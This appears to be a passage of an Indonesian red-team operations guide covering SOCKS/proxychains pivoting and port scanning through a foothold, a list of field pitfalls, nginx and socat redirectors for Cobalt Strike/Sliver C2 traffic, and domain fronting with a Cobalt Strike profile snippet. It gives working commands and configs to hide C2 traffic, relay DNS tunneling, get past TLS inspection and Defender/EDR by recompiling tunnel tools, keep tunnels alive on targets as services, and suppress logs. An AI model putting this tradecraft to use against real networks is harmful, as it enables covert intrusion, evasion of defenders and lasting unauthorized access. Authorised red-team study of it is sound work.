```
strict_chain
[ProxyList]
socks5 127.0.0.1 1080 redteam Str0ngP@ss
socks5 127.0.0.1 1081
```

### 5.2 NMAP melalui SOCKS

Nmap TCP connect scan via proxychains (proxychains hanya bisa intercept `connect()`, jadi **hanya** `-sT` yang valid; `-sS` **akan gagal diam-diam atau log error**):

```bash
proxychains4 -f /etc/proxychains4.conf \
  nmap -sT -Pn -n -p- --open -T4 \
       --max-retries 1 --host-timeout 30m \
       -oA loot/10.10.0.20_allports \
       10.10.0.20
```

Batas praktis: ~65k port × RTT through pivot. Estimasi dengan RTT 60ms: ~65 menit. Percepat dengan `--min-parallelism 64 --max-parallelism 256` **hanya** jika pivot sanggup (chisel: naikkan `--keepalive` & antrian; ligolo-ng: jauh lebih longgar).

Versi `masscan` **tidak kompatibel** dengan proxychains (raw socket). Alternatif cepat melalui SOCKS5: `nmap --proxies socks4://127.0.0.1:1080` (aktif hanya NSE HTTP proxy, tidak untuk port scan), atau `gost` sebagai port-forward banyak port.

Alternatif tanpa proxychains — `gost` sebagai socks + port-forward langsung ke target:
```bash
# di attacker, pakai SOCKS chisel yang sudah jalan
gost -L tcp://127.0.0.1:2222/10.10.0.20:22 -F socks5://127.0.0.1:1080
gost -L tcp://127.0.0.1:13389/10.10.0.20:3389 -F socks5://127.0.0.1:1080
```

### 5.3 Verifikasi & troubleshooting

```bash
proxychains4 curl -sv --max-time 8 http://10.10.0.20/
proxychains4 -q ncat -vz 10.10.0.20 445
```

Log diagnosis umum:
- `|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.20:445-<><>-OK` → sukses.
- `...timeout` → target unreachable dari foothold, bukan masalah proxychains.
- `...refused` → SOCKS server menolak (auth/config chisel) atau port target tutup.
- `couldn't connect to proxy 127.0.0.1:1080` → chisel/ssh -D mati.
- `DNS request timed out` → `proxy_dns` belum aktif, atau `remote_dns_subnet` konflik.

Cek DNS: `proxychains4 dig +short internal.corp A @10.10.0.2` — bila gagal, set `proxy_dns` dan pakai SOCKS server yang support CONNECT ke `:53` UDP (chisel/ssh -D **tidak** proxy UDP).

## 6. Jebakan Operasional (yang bikin gagal di lapangan)

1. **`ssh -D` tidak proxy UDP/DNS kecuali socks5 -h**; tools yang pakai `getaddrinfo` lokal resolve di mesin attacker → DNS leak + gagal resolusi internal. Selalu `proxychains ... socks5` dengan `proxy_dns`, atau `curl --socks5-hostname` bukan `--socks5`.
2. **DNS over SOCKS tidak tembus chisel/ssh** untuk UDP. Pakai DoH (`curl --doh-url`) atau forward DNS TCP via `socat TCP-LISTEN:5353,fork TCP:10.10.0.2:53` di foothold.
3. **`sshd` target `AllowTcpForwarding no` / `PermitOpen`** → `-L`, `-D`, `-R` semua menghasilkan `administratively prohibited: open failed`. Verifikasi: `ssh -v ... 2>&1 | grep -i 'forward\|permit'`.
4. **Egress firewall korp** mem-blok port non-443 padahal ICMP hidup → chisel default `:8080` mati, tapi `--tls-domain` + `:443` hidup. Uji `nc -vz` dulu.
5. **TLS inspection (Palo Alto/Fortinet)** memutus chisel/ligolo self-signed. Gejala: `tls: bad certificate`, `handshake failure`, atau TCP reset tepat setelah ClientHello. Mitigasi: `--tls-domain` SNI valid + cert Let's Encrypt di VPS, atau framing WebSocket via `--ws` (chisel) / domain fronting (terbatas), atau fallback SSH:22 jika terbuka.
6. **Windows Defender / EDR** mem-flag `chisel.exe`, `frpc.exe`, `agent.exe` (ligolo) setelah beberapa menit. Rename + strip metadata tidak cukup di Defender 24H2. Pertimbangkan `gost` (Go kecil, sering lebih tenang) atau compile ulang dengan `-ldflags "-s -w -X main.version=…"`.
7. **`sudo ip tuntap add` di container/WSL** sering `operation not permitted` → ligolo-ng **wajib** host dengan CAP_NET_ADMIN. Di WSL2 perlu kernel `tun` (`CONFIG_TUN=y`) dan `--privileged` tidak cukup; jalankan proxy di VM Linux penuh.
8. **Route ligolo konflik** dengan `docker0`/`virbr0`: `ip route add 10.10.0.0/16 dev ligolo0` menutupi docker subnet. Pilih range `240.0.0.0/4` (sesuai default ligolo) dan subnet target yang tidak overlap.
9. **Chisel keepalive** default 25s tapi jika proxy korp meng-idle-kill 30s, sesi drop tiap ~1 menit. Set `--keepalive 10s` **di server dan client**. frp: `transport.heartbeatInterval = 10`, `transport.heartbeatTimeout = 30`.
10. **frp `remotePort` bentrok multi-klien** → `port 13389 already used`. Aktifkan `allowPorts` di `frps` dengan range unik per operator; jangan hardcode di `frpc`.
11. **ngrok free plan** mengganti URL tiap restart → script RDP ke target pecah. Rekam URL saat runtime: `ngrok start --all --log=stdout | tee ngrok.log | grep -oE 'tcp://[^ ]+'`. Untuk stabil, pakai paket berbayar atau domain custom.
12. **Proxychains `-q` menyembunyikan error**; selalu debug pertama dengan `-v` atau logfile (`-f`+`-v`), terutama jika `curl` pgrep kosong.
13. **Nmap `-sV`/`-O` via proxychains** sebagian besar gagal karena probe raw/UDP; hanya `-sT` dan NSE tertentu via CONNECT yang jalan. Jangan percaya hasil `-sV` kosong sebagai "unknown".
14. **`socat` tanpa `fork`** hanya menerima **satu** koneksi. Selalu `fork,reuseaddr`; untuk keperluan debug pakai `-d -d -v` untuk melihat byte stream di stderr.
15. **`ssh -R` bind 0.0.0.0 gagal senyap** jika server `GatewayPorts no` (default). Cek `ss -lntp` di server — jika hanya `127.0.0.1:1080`, `GatewayPorts` belum aktif.
16. **Reverse tunnel tanpa `ExitOnForwardFailure=yes`** membuat `ssh -R` sukses login tapi tidak membuka port; `ps` menunjukkan proses hidup, tapi attacker tak bisa connect. Selalu pasang flag ini dan cek exit code.
17. **Ligolo `-selfcert` tanpa pin** di jaringan monitored: cert CA berubah tiap restart proxy; agent lama tidak bisa reconnect. Simpan `certs/` (`-selfcert` menyimpan ke folder kerja) dan jangan hapus.
18. **Proxychains + aplikasi statically-linked** (Go/Rust) mengabaikan `LD_PRELOAD`. Nmap versi distro OK; `nuclei`, `ffuf`, `httpx` biner Go **tidak** kena proxychains — pakai env `HTTP_PROXY`/`HTTPS_PROXY` atau `-proxy` flag bawaan tool.
19. **Sesi chisel/frp di target tanpa supervisor** mati saat shell terputus. Persistensikan: `systemd-run --scope`, `sc create`, atau Windows Service via `nssm`. Hindari `nohup` saja.
20. **Timestamp drift** antara VPS dan target memutus TLS validasi & token JWT gost/ngrok. Pastikan NTP client jalan di VPS; target korp biasanya sync → beda jam memicu `tls: certificate is not yet valid`.

## 1. Redirector — nginx 1.25 Stream (L4) & socat

### 1.1 nginx stream (TCP passthrough, TLS tidak di-terminate)

`/etc/nginx/nginx.conf`:

```nginx
load_module modules/ngx_stream_module.so;

events { worker_connections 4096; }

stream {
    upstream c2_beacon {
        server 10.10.10.50:443;
    }

    # Malleable/HTTPS C2 hanya terima dari UA/path tertentu via SNI + allowlist
    map $ssl_preread_server_name $backend {
        c2.example-cdn.com   c2_beacon;
        default              blackhole;
    }

    upstream blackhole { server 127.0.0.1:9; }

    server {
        listen 443;
        proxy_pass $backend;
        ssl_preread on;
        proxy_connect_timeout 5s;
        proxy_timeout 600s;
        proxy_buffer_size 16k;
    }
}
```

Perintah verifikasi:

```bash
nginx -t && systemctl reload nginx
ss -tnp 'sport = :443'
curl -kI --resolve c2.example-cdn.com:443:203.0.113.10 https://c2.example-cdn.com/  # harus reset/kosong
```

- **Dikirim:** TLS ClientHello utuh ke backend; nginx tidak melihat plaintext.
- **Muncul:** SNI + IP klien di log `access_log /var/log/nginx/stream.log stream;`. Prefix TLS fingerprint (JA3/JA4) tetap milik implan, bukan nginx — jangan pakai curl sebagai baseline fingerprint.
- **Berhasil** karena backend C2 (Cobalt Strike team server 4.9 / Sliver / Mythic) menerima TLS apapun. **Gagal** jika upstream hanya terima TLS 1.2 sementara implan default TLS 1.3, atau jika SNI mismatch → semua jatuh ke `blackhole`.

### 1.2 socat (fallback cepat, tanpa SNI filter)

```bash
# TCP passthrough 443 -> TS 8443
socat TCP-LISTEN:443,reuseaddr,fork,keepalive TCP:10.10.10.50:8443

# UDP/53 DNS tunneling relay
socat UDP-LISTEN:53,reuseaddr,fork UDP:10.10.10.60:53
```

**Catatan OPSEC socat:** tidak ada SNI inspection, tidak ada rate limit, tidak ada IP allowlist → fingerprinting mudah. Hanya untuk lab atau pivot sementara. `socat` menulis setiap conn ke syslog (`journald`) — strip dengan `-d -d` off dan `StandardOutput=null` di unit systemd.

### 1.3 Redirector HTTP (L7) — nginx reverse proxy dengan path filter

```nginx
server {
    listen 443 ssl http2;
    server_name cdn.example.com;
    ssl_certificate     /etc/letsencrypt/live/cdn.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.example.com/privkey.pem;

    # hanya path malleable profile yang di-proxy
    location ~ ^/(api/v1/[a-z]{4}|updates/check)$ {
        proxy_pass https://10.10.10.50:443;
        proxy_ssl_server_name on;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For "";
        proxy_set_header X-Real-IP "";
        proxy_redirect off;
    }

    # semua selain itu: 404 dari nginx lokal (bukan proxy)
    location / { return 404; }
}
```

- **Dikirim:** hanya request GET/POST ke path profile ke backend. Header `X-Forwarded-For`/`X-Real-IP` dihapus, tapi **`X-Forwarded-Proto` dan `via`** sering lupa di-strip — strip eksplisit: `proxy_set_header Via "";`.
- **Muncul:** nginx `access.log` mencatat full URI + User-Agent. Jika malleable profile pakai UA Chrome 131, log redirector akan beda dengan UA yang akhirnya masuk ke TS. Sinkronkan UA whitelist di redirector **dan** profile.

## 2. Domain Fronting

### 2.1 Mekanisme

Request dengan **SNI = domain CDN/edge publik** (mis. `cdn.cloudfront.net` atau hostname allowed tenant), sementara **HTTP Host header = hostname origin milik kita** yang di-serve oleh edge yang sama. Edge meneruskan by Host → origin.

Cobalt Strike 4.9 profile snippet:

```
https-certificate {
    set CN "cdn.cloudfront.net";
}

http-get {
    set uri "/api/";
    client {
        header "Host" "origin-abc.cloudfront.net";   # hostname kita
        metadata { base64; prepend "s="; header "Cookie"; }
    }
}
```

Test manual (curl):

```bash
curl -skI https://allowed.example.com/ \
  -H "Host: our-origin.cloudfront.net" \
  --resolve allowed.example.com:443:203.0.113.99
```

- **Dikirim:** SNI `allowed.example.com`; on-wire Host `our-origin.cloudfront.net`.
- **Muncul:** edge CDN meneruskan ke origin kita; log client-facing CDN hanya lihat `allowed.example.com`.
- **Kenapa berhasil:** edge routing by HTTP Host, TLS termination di edge.
- **Kenapa gagal (2024–2025):** CloudFront mengaktifkan **strict SNI-to-Host binding** (2021+); Azure Front Door menolak mismatch sejak 2022; GCP Cloud CDN menolak Host tidak terdaftar. `Fastly` masih relatif longgar per-vendor tapi butuh TLS subscription config. `Cloudflare` menolak (525/421). **Domain fronting praktis mati di CloudFront/Azure.**
- **Alternatif:** *domain shadowing* (multiple subdomain di cert SAN edge), atau *C2 via legitimate SaaS* (Slack/Teams webhook, Notion API) — bukan fronting tapi overlap.

---
